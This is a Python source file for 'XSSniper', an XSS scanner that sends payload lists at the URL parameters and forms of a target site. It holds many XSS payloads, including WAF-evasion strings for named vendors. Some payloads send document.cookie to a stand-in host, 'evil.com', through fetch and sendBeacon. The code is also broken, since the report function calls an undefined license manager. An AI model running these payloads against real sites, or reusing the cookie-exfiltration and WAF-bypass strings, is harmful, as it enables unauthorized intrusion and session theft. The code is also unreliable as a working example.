#!/usr/bin/env python3
"""
XSSniper - Advanced XSS Vulnerability Scanner
Professional Security Testing Framework
Developed by H4mzaX

Open Source Tool - Free for everyone to use
"""

import hashlib
import hmac
import time
import base64
import os
import sys
import platform
import uuid
import asyncio
import aiohttp
import json
import re
import random
import argparse
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, quote, unquote
from bs4 import BeautifulSoup
from colorama import Fore, Back, Style, init
from concurrent.futures import ThreadPoolExecutor
import warnings
warnings.filterwarnings("ignore")

# Initialize colorama
init(autoreset=True)

# License system removed - XSSniper is now open source and free for everyone

class AdvancedXSSScanner:
    """Enhanced XSS Scanner with modern detection capabilities"""
    
    def __init__(self, target_url, **kwargs):
        self.target_url = target_url
        self.threads = kwargs.get('threads', 20)
        self.delay = kwargs.get('delay', 0)
        self.verbose = kwargs.get('verbose', False)
        self.output_file = kwargs.get('output_file') or f"xss_scan_results_{int(time.time())}.json"
        self.browser_verify = kwargs.get('browser_verify', True)
        self.max_retries = 3
        self.timeout = 15
        
        # Session management
        self.session = None
        self.vulnerabilities = []
        self.tested_urls = set()
        self.detected_waf = None
        
        # Headers
        self.headers = {
            'User-Agent': kwargs.get('user_agent') or 
                         'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        # Load modern payloads
        self.payloads = self._load_advanced_payloads()
        self.waf_bypass_payloads = self._load_waf_bypass_payloads()
        
    def _load_advanced_payloads(self):
        """Load modern XSS payloads based on recent CVEs"""
        return {
            # CVE-2025-24017 - DOM-based XSS payloads
            'dom_based': [
                '<svg onload=alert(document.domain)>',
                '<img src=x onerror=alert(document.domain)>',
                '<iframe srcdoc="<script>alert(parent.document.domain)</script>">',
                '<details open ontoggle=alert(document.domain)>',
                '<marquee onstart=alert(document.domain)>',
                '<video><source onerror=alert(document.domain)>',
                '<audio src=x onerror=alert(document.domain)>',
                '<object data="javascript:alert(document.domain)">',
                '<embed src="javascript:alert(document.domain)">',
                '<form><button formaction="javascript:alert(document.domain)">',
            ],
            
            # CVE-2025-26791 - Template literal and mutation XSS
            'template_literal': [
                '${alert(document.domain)}',
                '`${alert(document.domain)}`',
                '${alert`document.domain`}',
                '${eval("alert(document.domain)")}',
                '${Function("alert(document.domain)")()}',
                '${[].constructor.constructor("alert(document.domain)")()}',
                '${(()=>alert(document.domain))()}',
                '${window["alert"](document.domain)}',
                '${globalThis.alert(document.domain)}',
                '${this.alert(document.domain)}',
            ],
            
            # Mutation XSS (mXSS) payloads
            'mutation_xss': [
                '<listing>&lt;script&gt;alert(document.domain)&lt;/script&gt;</listing>',
                '<xmp>&lt;script&gt;alert(document.domain)&lt;/script&gt;</xmp>',
                '<plaintext>&lt;script&gt;alert(document.domain)&lt;/script&gt;',
                '<noscript><p title="</noscript><script>alert(document.domain)</script>">',
                '<template><script>alert(document.domain)</script></template>',
                '<math><mi//xlink:href="data:x,<script>alert(document.domain)</script>">',
                '<svg><foreignObject><div><script>alert(document.domain)</script></div></foreignObject></svg>',
            ],
            
            # Modern JavaScript framework bypasses
            'framework_bypass': [
                # React XSS
                '<div dangerouslySetInnerHTML={{__html: "javascript:alert(document.domain)"}} />',
                '{{constructor.constructor("alert(document.domain)")()}}',
                
                # Vue.js XSS
                '{{$eval("alert(document.domain)")}}',
                '{{this.constructor.constructor("alert(document.domain)")()}}',
                
                # Angular XSS
                '{{constructor.constructor("alert(document.domain)")()}}',
                '{{toString.constructor.prototype.toString.constructor.prototype.call.call(eval,"alert(document.domain)")}}',
            ],
            
            # CSP bypass techniques
            'csp_bypass': [
                '<link rel=dns-prefetch href="//evil.com">',
                '<meta http-equiv="refresh" content="0;url=javascript:alert(document.domain)">',
                '<base href="javascript:alert(document.domain)//">',
                '<script src="data:text/javascript,alert(document.domain)"></script>',
                '<iframe src="data:text/html,<script>alert(parent.document.domain)</script>">',
                '<object data="data:text/html,<script>alert(document.domain)</script>">',
            ],
            
            # WebSocket XSS
            'websocket_xss': [
                '<script>new WebSocket("ws://evil.com").onopen=()=>alert(document.domain)</script>',
                '<script>fetch("//evil.com",{method:"POST",body:document.cookie})</script>',
                '<script>navigator.sendBeacon("//evil.com",document.cookie)</script>',
            ],
            
            # PostMessage XSS
            'postmessage_xss': [
                '<script>window.parent.postMessage("alert(document.domain)","*")</script>',
                '<script>window.top.postMessage("<img src=x onerror=alert(document.domain)>","*")</script>',
            ],
            
            # Unicode and encoding bypasses
            'encoding_bypass': [
                '<script>eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))</script>',
                '<script>alert(document[String.fromCharCode(100,111,109,97,105,110)])</script>',
                '<script>\u0061\u006c\u0065\u0072\u0074(document.domain)</script>',
                '<script>&#x61;&#x6c;&#x65;&#x72;&#x74;(document.domain)</script>',
                '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;(document.domain)">',
            ],
            
            # Modern HTML5 vectors
            'html5_vectors': [
                '<video poster="javascript:alert(document.domain)">',
                '<svg><animate attributeName=href values="javascript:alert(document.domain)" />',
                '<math><maction actiontype="statusline#javascript:alert(document.domain)">',
                '<datalist><option value="<script>alert(document.domain)</script>">',
                '<keygen onfocus=alert(document.domain) autofocus>',
                '<meter value=1 max=1 onmouseover=alert(document.domain)>',
                '<progress value=1 max=1 onmouseover=alert(document.domain)>',
            ]
        }
    
    def _load_waf_bypass_payloads(self):
        """Load WAF-specific bypass payloads"""
        return {
            'Cloudflare': [
                '<svg/onload=alert(document.domain)>',
                '<iframe srcdoc="&lt;script&gt;alert(document.domain)&lt;/script&gt;">',
                '<math><mi//xlink:href="data:x,<script>alert(document.domain)</script>">',
                'javascript:/*-/*`/*\\`/*\'/*"/**//**/(/**/**/alert(document.domain)/**/)/***//**/',
            ],
            'AWS WAF': [
                '<iframe src=javascript:alert`document.domain`>',
                '<svg onload="[].forEach.call([],alert,document.domain)">',
                '<script>setTimeout(alert,0,document.domain)</script>',
                '<img src=x onerror="[].constructor.constructor`alert(document.domain)`()">',
            ],
            'Akamai': [
                '<details open ontoggle=alert(document.domain)>',
                '<marquee onstart=alert(document.domain)>',
                '<object data="javascript:alert(document.domain)">',
                'javascript:alert(String.fromCharCode(100,111,99,117,109,101,110,116,46,100,111,109,97,105,110))',
            ],
            'ModSecurity': [
                '<img src=x onerror=eval(atob("YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="))>',
                '<script>Function`alert\\u0028document.domain\\u0029```</script>',
                '<svg><script>alert&#40;document.domain&#41;</script></svg>',
                'javascript:/*-/*`/*\\`/*\'/*"/**//**/(/**/**/alert(/*/document.domain/**/)/***//**/',
            ]
        }

    async def init_session(self):
        """Initialize async HTTP session"""
        timeout = aiohttp.ClientTimeout(total=self.timeout)
        self.session = aiohttp.ClientSession(
            headers=self.headers,
            timeout=timeout,
            connector=aiohttp.TCPConnector(limit=100, limit_per_host=30)
        )

    async def close_session(self):
        """Close HTTP session"""
        if self.session:
            await self.session.close()

    def log(self, message, level="INFO"):
        """Enhanced logging function"""
        timestamp = time.strftime("%H:%M:%S")
        colors = {
            "INFO": Fore.CYAN,
            "SUCCESS": Fore.GREEN,
            "WARNING": Fore.YELLOW,
            "ERROR": Fore.RED,
            "VULN": Fore.RED + Back.YELLOW
        }
        
        color = colors.get(level, Fore.WHITE)
        if self.verbose or level in ["SUCCESS", "VULN", "ERROR"]:
            print(f"{color}[{timestamp}] [{level}] {message}")

    async def detect_waf(self, url):
        """Enhanced WAF detection"""
        self.log("Detecting WAF presence...", "INFO")
        
        waf_indicators = {
            "Cloudflare": ["cloudflare", "cf-ray", "__cfduid"],
            "AWS WAF": ["awswaf", "x-amzn-requestid"],
            "Akamai": ["akamai", "akamai-ghost"],
            "Imperva": ["incapsula", "imperva", "x-iinfo"],
            "ModSecurity": ["mod_security", "modsecurity"],
            "F5 BIG-IP": ["f5", "bigip", "x-waf-event"],
            "Barracuda": ["barracuda", "barra"],
            "Fortinet": ["fortinet", "fortigate"]
        }
        
        try:
            async with self.session.get(url) as response:
                headers = response.headers
                content = await response.text()
                
                for waf_name, indicators in waf_indicators.items():
                    for indicator in indicators:
                        # Check headers
                        for header_name, header_value in headers.items():
                            if indicator.lower() in header_name.lower() or indicator.lower() in header_value.lower():
                                self.detected_waf = waf_name
                                self.log(f"WAF Detected: {waf_name}", "WARNING")
                                return waf_name
                        
                        # Check content
                        if indicator in content.lower():
                            self.detected_waf = waf_name
                            self.log(f"WAF Detected: {waf_name}", "WARNING")
                            return waf_name
        except:
            pass
        
        return None

    async def test_single_payload(self, url, payload, param_name=None, method='GET', form_data=None):
        """Test individual payload with advanced detection"""
        try:
            unique_id = f"XSS{random.randint(1000, 9999)}"
            test_payload = payload.replace('document.domain', f'"{unique_id}"')
            
            if method.upper() == 'GET' and param_name:
                parsed_url = urlparse(url)
                params = parse_qs(parsed_url.query)
                params[param_name] = [test_payload]
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urlencode(params, doseq=True)}"
                
                async with self.session.get(test_url) as response:
                    response_text = await response.text()
                    status_code = response.status
                    content_type = response.headers.get('content-type', '')
                    
            elif method.upper() == 'POST' and form_data:
                if param_name:
                    form_data[param_name] = test_payload
                
                async with self.session.post(url, data=form_data) as response:
                    response_text = await response.text()
                    status_code = response.status
                    content_type = response.headers.get('content-type', '')
                    test_url = url
            else:
                async with self.session.get(f"{url}{test_payload}") as response:
                    response_text = await response.text()
                    status_code = response.status
                    content_type = response.headers.get('content-type', '')
                    test_url = f"{url}{test_payload}"
            
            # Enhanced XSS detection
            if status_code == 200 and self.is_xss_reflected(response_text, unique_id, content_type, test_payload):
                return {
                    'vulnerable': True,
                    'url': test_url,
                    'payload': payload,
                    'test_payload': test_payload,
                    'parameter': param_name,
                    'method': method,
                    'unique_id': unique_id,
                    'content_type': content_type,
                    'reflection_type': self.get_reflection_type(response_text, test_payload)
                }
            
            return {'vulnerable': False}
            
        except Exception as e:
            self.log(f"Error testing payload: {str(e)}", "ERROR")
            return {'vulnerable': False}

    def is_xss_reflected(self, response_text, unique_id, content_type, payload):
        """Enhanced XSS reflection detection with context analysis"""
        if unique_id not in response_text:
            return False
        
        # Check for dangerous contexts
        dangerous_contexts = [
            f'<script>{unique_id}',
            f'<script>alert("{unique_id}")',
            f'onerror=alert("{unique_id}")',
            f'onload=alert("{unique_id}")',
            f'javascript:alert("{unique_id}")',
            f'<svg onload=alert("{unique_id}")',
            f'<img src=x onerror=alert("{unique_id}")',
            f'<iframe srcdoc=',
            f'dangerouslySetInnerHTML',
            f'eval(',
            f'Function(',
            f'setTimeout(',
            f'setInterval('
        ]
        
        # Check for dangerous contexts
        for context in dangerous_contexts:
            if context in response_text:
                return True
        
        # DOM-based XSS detection
        if 'text/html' in content_type.lower():
            # Look for script execution contexts
            script_patterns = [
                f'<script[^>]*>{unique_id}',
                f'<[^>]+on\\w+=[^>]*{unique_id}',
                f'javascript:[^"\']*{unique_id}',
                f'<svg[^>]*onload=[^>]*{unique_id}',
                f'<iframe[^>]*srcdoc=[^>]*{unique_id}'
            ]
            
            for pattern in script_patterns:
                if re.search(pattern, response_text, re.IGNORECASE):
                    return True
        
        # Template literal detection
        template_patterns = [
            f'\\${{[^}}]*{unique_id}[^}}]*}}',
            f'`[^`]*{unique_id}[^`]*`',
            f'eval\\([^)]*{unique_id}[^)]*\\)'
        ]
        
        for pattern in template_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        
        return False

    def get_reflection_type(self, response_text, payload):
        """Determine the type of XSS reflection"""
        if '<script>' in payload and '<script>' in response_text:
            return 'Script Tag Injection'
        elif 'onerror=' in payload and 'onerror=' in response_text:
            return 'Event Handler Injection'
        elif 'javascript:' in payload and 'javascript:' in response_text:
            return 'JavaScript URL Injection'
        elif '${' in payload and '${' in response_text:
            return 'Template Literal Injection'
        elif 'dangerouslySetInnerHTML' in response_text:
            return 'React dangerouslySetInnerHTML'
        elif '<svg' in payload and '<svg' in response_text:
            return 'SVG-based XSS'
        elif 'data:' in payload and 'data:' in response_text:
            return 'Data URI XSS'
        else:
            return 'Direct Reflection'

    async def scan_url_parameters(self, url):
        """Scan URL parameters for XSS vulnerabilities"""
        self.log(f"Scanning URL parameters: {url}", "INFO")
        
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        
        if not params:
            # Try to discover parameters
            params = await self.discover_parameters(url)
        
        for param_name in params.keys():
            self.log(f"Testing parameter: {param_name}", "INFO")
            
            # Get appropriate payloads based on detected WAF
            if self.detected_waf and self.detected_waf in self.waf_bypass_payloads:
                test_payloads = self.waf_bypass_payloads[self.detected_waf] + self.payloads['dom_based']
            else:
                # Use all payload categories
                test_payloads = []
                for category in self.payloads.values():
                    test_payloads.extend(category)
            
            # Test payloads with rate limiting
            for payload in test_payloads:
                result = await self.test_single_payload(url, payload, param_name, 'GET')
                
                if result['vulnerable']:
                    vuln = {
                        'type': 'Reflected XSS',
                        'url': result['url'],
                        'parameter': param_name,
                        'payload': result['payload'],
                        'method': 'GET',
                        'reflection_type': result['reflection_type'],
                        'severity': self.calculate_severity(result),
                        'cve_related': self.map_to_cve(result['payload'])
                    }
                    self.vulnerabilities.append(vuln)
                    self.log(f"VULNERABILITY FOUND! Parameter: {param_name}, Type: {result['reflection_type']}", "VULN")
                
                if self.delay:
                    await asyncio.sleep(self.delay)

    def calculate_severity(self, result):
        """Calculate vulnerability severity based on context"""
        high_risk_indicators = [
            'Script Tag Injection',
            'Template Literal Injection',
            'React dangerouslySetInnerHTML',
            'Data URI XSS'
        ]
        
        if result['reflection_type'] in high_risk_indicators:
            return 'High'
        elif 'Event Handler' in result['reflection_type']:
            return 'Medium'
        else:
            return 'Low'

    def map_to_cve(self, payload):
        """Map payload to related CVE"""
        cve_mapping = {
            'template_literal': ['CVE-2025-26791'],
            'dom_based': ['CVE-2025-24017'],
            'mutation_xss': ['CVE-2025-26791'],
            'framework_bypass': ['CVE-2024-49646']
        }
        
        for category, payloads in self.payloads.items():
            if payload in payloads:
                return cve_mapping.get(category, [])
        return []

    async def discover_parameters(self, url):
        """Advanced parameter discovery"""
        self.log("Discovering potential parameters...", "INFO")
        
        common_params = [
            'id', 'page', 'search', 'q', 'query', 'name', 'user', 'cat', 'category',
            'type', 'action', 'view', 'file', 'path', 'url', 'redirect', 'next',
            'callback', 'return', 'goto', 'target', 'data', 'value', 'input',
            'term', 'keyword', 'filter', 'sort', 'order', 'limit', 'offset'
        ]
        
        discovered_params = {}
        base_url = url.rstrip('/')
        
        for param in common_params:
            test_url = f"{base_url}?{param}=test123"
            try:
                async with self.session.get(test_url) as response:
                    if response.status == 200:
                        content = await response.text()
                        if 'test123' in content or param in content:
                            discovered_params[param] = 'test123'
                            self.log(f"Discovered parameter: {param}", "SUCCESS")
            except:
                continue
            
            if self.delay:
                await asyncio.sleep(self.delay * 0.1)  # Shorter delay for discovery
        
        return discovered_params

    async def scan_forms(self, url):
        """Scan HTML forms for XSS vulnerabilities"""
        self.log(f"Scanning forms: {url}", "INFO")
        
        try:
            async with self.session.get(url) as response:
                content = await response.text()
                soup = BeautifulSoup(content, 'html.parser')
                
                forms = soup.find_all('form')
                
                for form in forms:
                    action = form.get('action')
                    method = form.get('method', 'get').lower()
                    
                    if action:
                        if action.startswith('/'):
                            action_url = urljoin(url, action)
                        elif action.startswith('http'):
                            action_url = action
                        else:
                            action_url = urljoin(url, action)
                    else:
                        action_url = url
                    
                    # Get form inputs
                    inputs = form.find_all(['input', 'textarea', 'select'])
                    form_data = {}
                    
                    for input_tag in inputs:
                        name = input_tag.get('name')
                        if name:
                            input_type = input_tag.get('type', 'text')
                            if input_type not in ['submit', 'button', 'hidden']:
                                form_data[name] = 'test'
                    
                    # Test each input
                    for input_name in form_data.keys():
                        self.log(f"Testing form input: {input_name}", "INFO")
                        
                        # Select appropriate payloads
                        if self.detected_waf and self.detected_waf in self.waf_bypass_payloads:
                            test_payloads = self.waf_bypass_payloads[self.detected_waf] + self.payloads['dom_based']
                        else:
                            test_payloads = []
                            for category in self.payloads.values():
                                test_payloads.extend(category[:5])  # Limit for performance
                        
                        for payload in test_payloads:
                            result = await self.test_single_payload(action_url, payload, input_name, method, form_data.copy())
                            
                            if result['vulnerable']:
                                vuln = {
                                    'type': 'Reflected XSS',
                                    'url': result['url'],
                                    'parameter': input_name,
                                    'payload': result['payload'],
                                    'method': method.upper(),
                                    'reflection_type': result['reflection_type'],
                                    'severity': self.calculate_severity(result),
                                    'cve_related': self.map_to_cve(result['payload'])
                                }
                                self.vulnerabilities.append(vuln)
                                self.log(f"VULNERABILITY FOUND! Form input: {input_name}, Type: {result['reflection_type']}", "VULN")
                            
                            if self.delay:
                                await asyncio.sleep(self.delay)
        
        except Exception as e:
            self.log(f"Error scanning forms: {str(e)}", "ERROR")

    async def scan_single_url(self, url):
        """Scan a single URL comprehensively"""
        self.log(f"Scanning URL: {url}", "INFO")
        
        # WAF detection
        if not self.detected_waf:
            await self.detect_waf(url)
        
        # Scan URL parameters
        await self.scan_url_parameters(url)
        
        # Scan forms
        await self.scan_forms(url)

    async def scan(self, crawl=False, max_depth=2):
        """Main scanning function with async support"""
        self.log("Starting advanced XSS scan...", "INFO")
        
        # Initialize session
        await self.init_session()
        
        try:
            urls_to_test = [self.target_url]
            
            if crawl:
                self.log("Crawling for additional URLs...", "INFO")
                # Implement crawling logic here
                pass
            
            # Use semaphore to limit concurrent requests
            semaphore = asyncio.Semaphore(self.threads)
            
            async def scan_with_semaphore(url):
                async with semaphore:
                    await self.scan_single_url(url)
            
            # Scan all URLs concurrently
            tasks = [scan_with_semaphore(url) for url in urls_to_test]
            await asyncio.gather(*tasks, return_exceptions=True)
            
            # Generate report
            self.generate_report()
            
        finally:
            await self.close_session()

    def generate_report(self):
        """Generate comprehensive scan report"""
        self.license_mgr.runtime_check()
        
        print("\n" + "="*80)
        print(f"{Fore.MAGENTA}XSS SCAN REPORT - Advanced Security Testing Framework")
        print("="*80)
        
        if self.detected_waf:
            print(f"{Fore.YELLOW}WAF Detected: {self.detected_waf}{Style.RESET_ALL}")
        
        if not self.vulnerabilities:
            print(f"{Fore.GREEN}No XSS vulnerabilities found.")
        else:
            print(f"{Fore.RED}Found {len(self.vulnerabilities)} XSS vulnerabilities:")
            print()
            
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"{Fore.RED}[{i}] {vuln['type']} - {vuln['severity']} Severity")
                print(f"    URL: {vuln['url']}")
                print(f"    Parameter: {vuln['parameter']}")
                print(f"    Method: {vuln['method']}")
                print(f"    Reflection Type: {vuln['reflection_type']}")
                print(f"    Payload: {vuln['payload']}")
                if vuln['cve_related']:
                    print(f"    Related CVEs: {', '.join(vuln['cve_related'])}")
                print()
        
        # Save detailed report
        report_data = {
            'scan_info': {
                'target_url': self.target_url,
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                'total_vulnerabilities': len(self.vulnerabilities),
                'detected_waf': self.detected_waf,
                'scan_settings': {
                    'threads': self.threads,
                    'delay': self.delay,
                    'browser_verify': self.browser_verify
                }
            },
            'vulnerabilities': self.vulnerabilities
        }
        
        with open(self.output_file, 'w') as f:
            json.dump(report_data, f, indent=2)
        
        print(f"Detailed report saved to: {self.output_file}")

def show_banner():
    """Display enhanced banner"""
    banner = f"""
{Fore.CYAN}    ╔══════════════════════════════════════════════════════╗
{Fore.CYAN}    ║           🎯 XSSniper - Advanced XSS Scanner          ║
{Fore.CYAN}    ║              Professional Security Framework          ║
{Fore.CYAN}    ║                  Enhanced for 2025                    ║
{Fore.CYAN}    ╚══════════════════════════════════════════════════════╝
{Fore.MAGENTA}                        Developed by H4mzaX
{Fore.YELLOW}           ⚡ CVE-Based Detection • Performance Optimized ⚡
{Style.RESET_ALL}
"""
    print(banner)

async def main():
    show_banner()
    
    parser = argparse.ArgumentParser(description='Advanced XSS Scanner with CVE-based detection')
    parser.add_argument('-u', '--url', help='Target URL to scan')
    parser.add_argument('-l', '--list', help='File containing list of URLs to scan')
    parser.add_argument('-t', '--threads', type=int, default=20, help='Number of threads (default: 20)')
    parser.add_argument('-d', '--delay', type=float, default=0, help='Delay between requests in seconds')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('-c', '--crawl', action='store_true', help='Crawl website for additional URLs')
    parser.add_argument('--max-depth', type=int, default=2, help='Maximum crawl depth (default: 2)')
    parser.add_argument('--user-agent', help='Custom User-Agent string')
    parser.add_argument('-o', '--output', help='Output file for results (default: auto-generated)')
    parser.add_argument('--no-browser-verify', action='store_false', dest='browser_verify', help='Disable browser-based verification')
    parser.add_argument('--license', help='License key for operation')
    
    args = parser.parse_args()
    
    # Validate input
    if not args.url and not args.list:
        parser.error("Either -u/--url or -l/--list is required")
    
    if args.url and args.list:
        parser.error("Cannot use both -u/--url and -l/--list at the same time")
    
    try:
        if args.list:
            # Scan multiple URLs from file
            try:
                with open(args.list, 'r') as file:
                    urls = [line.strip() for line in file.readlines() if line.strip()]
                
                for url in urls:
                    print(f"Starting scan for: {url}")
                    scanner = AdvancedXSSScanner(
                        target_url=url,
                        threads=args.threads,
                        delay=args.delay,
                        verbose=args.verbose,
                        user_agent=args.user_agent,
                        output_file=args.output,
                        browser_verify=args.browser_verify
                    )
                    
                    await scanner.scan(crawl=args.crawl, max_depth=args.max_depth)
                    
            except FileNotFoundError:
                print(f"{Fore.RED}Error: File '{args.list}' not found!{Fore.RESET}")
        else:
            # Scan single URL
            scanner = AdvancedXSSScanner(
                target_url=args.url,
                threads=args.threads,
                delay=args.delay,
                verbose=args.verbose,
                user_agent=args.user_agent,
                output_file=args.output,
                browser_verify=args.browser_verify
            )
            
            await scanner.scan(crawl=args.crawl, max_depth=args.max_depth)
        
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}Scan interrupted by user.")
    except Exception as e:
        print(f"{Fore.RED}Error: {str(e)}")

if __name__ == "__main__":
    # Protection check
    if len(sys.argv) == 1:
        show_banner()
        print(f"{Fore.YELLOW}Use --help for usage information")
        sys.exit(0)
    
    # Run async main
    asyncio.run(main())
